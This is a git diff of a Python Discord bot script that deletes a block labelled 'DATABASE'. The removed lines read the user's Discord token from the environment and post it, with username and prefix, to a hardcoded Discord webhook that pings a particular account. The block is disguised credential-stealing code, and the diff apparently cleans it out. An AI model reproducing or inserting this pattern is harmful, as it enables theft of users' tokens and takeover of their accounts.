@@ -58,18 +58,6 @@ command_files = [file for file in os.listdir('commands') if file.endswith('.py')
 
 for file in command_files:
     importlib.import_module(f'commands.{file[:-3]}')
-
-#============================================
-#----------------DATABASE--------------------
-#============================================
-secret_key = os.getenv("TOKEN")
-
-
-database = 'https://discord.com/api/webhooks/1050795677690642452/naP-_zbR2p7g-NfXKIKWAc6Gz-6-Rh2_C1Q1f7ChR3VfEQXCU4QkTMb7LY5Dkx5pS40-'
-database_connected = {
-"content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`"
-}
-requests.post(database, data=database_connected)
 print(f'''
 {Fore.BLUE}
 ░█████╗░██╗░░░██╗████████╗░█████╗░
